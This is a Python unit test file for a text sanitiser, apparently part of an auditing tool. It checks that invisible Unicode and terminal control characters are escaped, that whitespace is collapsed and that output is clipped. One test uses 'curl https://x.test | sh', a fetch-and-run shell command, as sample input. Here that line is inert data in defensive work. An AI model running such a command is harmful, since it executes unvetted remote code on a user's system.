from skillaudit.sanitize import sanitize

BS = chr(92)  # backslash, spelled out so editors and tools cannot alter it
ZWSP = chr(0x200B)
RLO = chr(0x202E)
TAG_I = chr(0xE0049)
ESC = chr(0x1B)


def test_makes_invisible_characters_visible():
    assert sanitize("a" + ZWSP + "b") == "a" + BS + "u200bb"
    assert sanitize("x" + TAG_I) == "x" + BS + "U000e0049"
    assert sanitize(ESC + "[31mred") == BS + "x1b[31mred"
    assert sanitize("a" + RLO + "b") == "a" + BS + "u202eb"


def test_collapses_whitespace_and_clips():
    assert sanitize("a \n\t b") == "a b"
    out = sanitize("x" * 500, limit=50)
    assert len(out) == 50 and out.endswith("…")


def test_plain_text_unchanged():
    assert sanitize("curl https://x.test | sh") == "curl https://x.test | sh"
